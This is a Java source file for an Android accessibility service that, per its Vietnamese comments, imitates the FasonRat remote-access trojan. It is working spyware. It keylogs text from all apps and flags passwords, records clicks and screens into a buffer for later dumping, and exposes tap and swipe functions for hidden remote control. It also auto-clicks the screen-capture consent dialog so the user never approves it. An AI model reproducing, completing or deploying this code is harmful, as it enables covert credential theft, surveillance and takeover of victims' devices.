package com.zeko.droid;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;
import java.util.List;

/**
 * Một service lo 3 việc (tham khảo cách FasonRat tách Keylogger/HVnc/Inspector rồi gộp lại):
 *  1. keylog: TYPE_VIEW_TEXT_CHANGED / FOCUSED / CLICKED / WINDOW_STATE_CHANGED
 *  2. điều khiển: dispatchGesture(tap/swipe) -> HVNC control
 *  3. best-effort tự bấm "Start now" ở hộp thoại xin quyền MediaProjection
 */
public class ZkAccessibilityService extends AccessibilityService {

    public static volatile ZkAccessibilityService INSTANCE;
    private static final StringBuilder BUFFER = new StringBuilder();
    private static final int MAX = 120_000;

    public static String dump() {
        synchronized (BUFFER) {
            String s = BUFFER.toString();
            BUFFER.setLength(0);
            return s;
        }
    }

    public static int pending() {
        synchronized (BUFFER) { return BUFFER.length(); }
    }

    @Override protected void onServiceConnected() {
        super.onServiceConnected();
        INSTANCE = this;
    }

    @Override public void onAccessibilityEvent(AccessibilityEvent e) {
        if (e == null) return;
        try {
            switch (e.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    captureText(e);
                    break;
                case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                    CharSequence t = e.getText() == null || e.getText().isEmpty() ? "" : e.getText().get(0);
                    if (t != null && t.length() > 0) append("[" + pkg(e) + "] click: " + t + "\n");
                    break;
                }
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: {
                    CharSequence cls = e.getClassName();
                    append("[" + pkg(e) + "] screen: " + (cls == null ? "?" : cls) + "\n");
                    autoAcceptProjection();
                    break;
                }
                default: break;
            }
        } catch (Throwable ignored) { }
    }

    private void captureText(AccessibilityEvent e) {
        AccessibilityNodeInfo src = null;
        try {
            src = e.getSource();
            boolean pwd = e.isPassword() || (src != null && src.isPassword());
            StringBuilder sb = new StringBuilder();
            if (e.getText() != null) for (CharSequence c : e.getText()) if (c != null) sb.append(c);
            if (sb.length() == 0 && src != null && src.getText() != null) sb.append(src.getText());
            String text = sb.toString();
            if (text.isEmpty()) return;
            append("[" + pkg(e) + "] " + (pwd ? "PASSWORD" : "text") + ": " + text + "\n");
        } catch (Throwable ignored) {
        } finally {
            if (src != null) try { src.recycle(); } catch (Throwable ignored) { }
        }
    }

    private static void append(String s) {
        synchronized (BUFFER) {
            BUFFER.append(s);
            if (BUFFER.length() > MAX) BUFFER.delete(0, BUFFER.length() - MAX);
        }
    }

    private static String pkg(AccessibilityEvent e) {
        CharSequence p = e.getPackageName();
        return p == null ? "?" : p.toString();
    }

    // ─────────── điều khiển từ xa (HVNC) ───────────
    public boolean tap(float x, float y) {
        if (Build.VERSION.SDK_INT < 24) return false;
        Path p = new Path();
        p.moveTo(x, y);
        GestureDescription g = new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(p, 0, 60))
                .build();
        return dispatchGesture(g, null, null);
    }

    public boolean swipe(float x1, float y1, float x2, float y2, int ms) {
        if (Build.VERSION.SDK_INT < 24) return false;
        Path p = new Path();
        p.moveTo(x1, y1);
        p.lineTo(x2, y2);
        GestureDescription g = new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(p, 0, Math.max(50, ms)))
                .build();
        return dispatchGesture(g, null, null);
    }

    public boolean lockScreen() {
        try {
            if (Build.VERSION.SDK_INT >= 28)
                return performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
        } catch (Throwable ignored) { }
        return false;
    }

    public boolean clickNode(String text) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;
            List<AccessibilityNodeInfo> found = root.findAccessibilityNodeInfosByText(text);
            if (found == null || found.isEmpty()) return false;
            for (AccessibilityNodeInfo n : found) {
                if (n.isClickable()) { boolean ok = n.performAction(AccessibilityNodeInfo.ACTION_CLICK); n.recycle(); return ok; }
                AccessibilityNodeInfo parent = n.getParent();
                if (parent != null) {
                    boolean ok = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    parent.recycle();
                    n.recycle();
                    if (ok) return true;
                }
                n.recycle();
            }
        } catch (Throwable ignored) { }
        return false;
    }

    /** Bấm hộp thoại MediaProjection (kỹ thuật FasonRat dùng AccessibilityNodeInfo thay vì user bấm). */
    private void autoAcceptProjection() {
        try {
            if (!Cfg.auto()) return;
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            String[] words = {"Start now", "Bắt đầu ngay", "Allow", "Cho phép", "立即开始", "开始"};
            for (String w : words) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(w);
                if (nodes == null || nodes.isEmpty()) continue;
                for (AccessibilityNodeInfo n : nodes) {
                    AccessibilityNodeInfo p = n.getParent();
                    boolean ok = n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    if (!ok && p != null) ok = p.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    if (p != null) p.recycle();
                    n.recycle();
                    if (ok) { append("[sys] auto-accept projection\n"); return; }
                }
            }
        } catch (Throwable ignored) { }
    }

    @Override public void onInterrupt() { }
}
